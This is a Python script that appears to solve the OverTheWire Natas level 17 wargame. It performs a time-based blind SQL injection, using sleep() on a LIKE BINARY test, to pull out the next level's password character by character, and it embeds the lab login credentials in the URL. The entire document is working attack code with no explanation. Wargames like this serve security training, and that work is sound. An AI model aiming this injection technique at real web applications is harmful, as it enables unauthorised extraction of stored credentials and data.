import string
import requests

URL = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
POSSIBLE_CHARS = string.ascii_letters + string.digits

def is_partial_password(password):
    # Geez this was a though one to figure out!
    r = requests.get(f'{URL}?username=natas18" AND IF(password LIKE BINARY "{password}%", sleep(1), NULL) %23')
    return r.elapsed.total_seconds() >= 1
        

def get_password(char_set, length):
    password = ''
    for _ in range(length):
        password += next(char for char in char_set if is_partial_password(password + char))
        print(password)
    return password    

if __name__ == '__main__':
    if requests.get(URL).status_code == requests.codes.ok:
         print(f'Password = {get_password(POSSIBLE_CHARS, 32)}')
    else:
        print('Authentication Failed!')
